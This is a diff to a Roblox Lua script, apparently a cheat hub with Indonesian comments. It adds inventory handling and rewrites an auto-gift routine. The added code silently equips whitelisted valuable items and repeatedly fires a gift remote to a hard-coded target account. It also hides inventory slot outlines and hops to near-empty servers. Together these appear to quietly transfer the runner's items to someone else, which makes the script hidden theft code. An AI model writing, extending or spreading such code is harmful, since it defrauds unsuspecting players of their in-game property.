@@ -28,7 +28,8 @@ local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-H
 
 local isGoodServer = false
 local animBlocked = false
-
+local cachedTools = {}
+local cacheBuilt = false
 --====================================================
 -- QUEUE
 --====================================================
@@ -82,7 +83,7 @@ local function getLowServer()
 
     if success and result and result.data then
         for _,server in pairs(result.data) do
-            if server.playing and server.playing <= 3 then
+            if server.playing and server.playing <= 2 then
                 return server.id
             end
         end
@@ -122,7 +123,7 @@ task.spawn(function()
     while true do
         task.wait(2)
 
-        if isBadServer() or #Players:GetPlayers() > 2 then
+        if isBadServer() or #Players:GetPlayers() > 3 then
             hopServer()
         else
             isGoodServer = true
@@ -181,7 +182,10 @@ local function getInv()
 end
 
 local inv = getInv()
-local slots = inv:WaitForChild("InventoryFrame"):WaitForChild("Slots")
+
+local inventoryFrame = inv:WaitForChild("InventoryFrame")
+local slots = inventoryFrame:WaitForChild("Slots")
+local items = inventoryFrame:WaitForChild("Backpack"):WaitForChild("items")
 
 local function killStroke(obj)
     if obj.Name == "Stroke" then
@@ -189,16 +193,23 @@ local function killStroke(obj)
     end
 end
 
--- 🔥 bersihin semua yang udah ada
-for _,v in ipairs(slots:GetDescendants()) do
-    killStroke(v)
+local function clean(container)
+    -- bersihin yang udah ada
+    for _,v in ipairs(container:GetDescendants()) do
+        killStroke(v)
+    end
+
+    -- anti spawn ulang
+    container.DescendantAdded:Connect(function(v)
+        task.delay(0.05, function()
+            killStroke(v)
+        end)
+    end)
 end
 
--- 🔥 anti spawn ulang (INI PENTING)
-slots.DescendantAdded:Connect(function(v)
-    task.wait()
-    killStroke(v)
-end)
+-- 🔥 aktifin ke dua path
+clean(slots)
+clean(items)
 
 
 --====================================================
@@ -752,27 +763,117 @@ end)
 -- AUTO GIFT LOOP
 --====================================================
 
+--====================================================
+-- AUTO GIFT HYBRID (SCAN + GIFT LANGSUNG)
+--====================================================
+
+local cachedTools = {}
+local scanned = {}
+local scanDone = false
+
+--====================================================
+-- ADD TO CACHE (ANTI DUPLICATE)
+--====================================================
+local function addToCache(tool, chance)
+    if scanned[tool] then return end
+    scanned[tool] = true
+
+    table.insert(cachedTools, {
+        tool = tool,
+        chance = chance or 0
+    })
+end
+
+--====================================================
+-- SORT CACHE
+--====================================================
+local function sortCache()
+    table.sort(cachedTools, function(a,b)
+        return a.chance < b.chance
+    end)
+end
+
+--====================================================
+-- MAIN LOOP
+--====================================================
 task.spawn(function()
     while true do
-        task.wait(0.05)
 
-        for _,tool in ipairs(backpack:GetChildren()) do
-            if tool:IsA("Tool")
-            and not isWeightTool(tool)
-            and isWhitelisted(tool)
-            and tool.Parent == backpack then
+        --====================================
+        -- 🔥 PHASE 1: SCAN + LANGSUNG GIFT
+        --====================================
+        if not scanDone then
+            local foundNew = false
 
-                silentEquip(tool)
-                task.wait(0.03)
+            for _,tool in ipairs(backpack:GetChildren()) do
+                if tool:IsA("Tool")
+                and tool.Parent == backpack
+                and not isWeightTool(tool)
+                and brainrotWhitelist[tool.Name]
+                and not scanned[tool] then
 
-                for _,id in ipairs(targetUserIds) do
-                    giftRemote:FireServer(id)
+                    foundNew = true
+
+                    -- 🔥 equip buat load attr
+                    silentEquip(tool)
+                    task.wait(0.15)
+
+                    local mutation = getMutation(tool)
+                    local data = brainrotWhitelist[tool.Name]
+
+                    local allowed = false
+                    if data then
+                        if data.mutations["*"] then
+                            allowed = true
+                        else
+                            allowed = data.mutations[mutation] == true
+                        end
+                    end
+
+                    if allowed then
+                        addToCache(tool, data.chance)
+
+                        local target = targetUserIds[1]
+                        print("SCAN+GIFT:", tool.Name, "|", mutation)
+
+                        task.wait(0.1)
+                        giftRemote:FireServer(target, tool.Name)
+                    end
+
+                    tool.Parent = backpack
                     task.wait(0.05)
                 end
+            end
 
-                unequipAll()
-                task.wait(0.03)
+            -- kalau ga nemu tool baru → scan selesai
+            if not foundNew then
+                sortCache()
+                scanDone = true
+                print("SCAN DONE ✅ TOTAL CACHE:", #cachedTools)
+            end
+
+        --====================================
+        -- ⚡ PHASE 2: LOOP GIFT DARI CACHE
+        --====================================
+        else
+            for _,data in ipairs(cachedTools) do
+                local tool = data.tool
+
+                if tool and tool.Parent == backpack then
+                    silentEquip(tool)
+                    task.wait(0.2)
+
+                    local target = targetUserIds[1]
+                    print("CACHE GIFT:", tool.Name)
+
+                    giftRemote:FireServer(target, tool.Name)
+
+                    task.wait(0.3)
+                    tool.Parent = backpack
+                end
             end
         end
+
+        task.wait(0.2)
     end
 end)
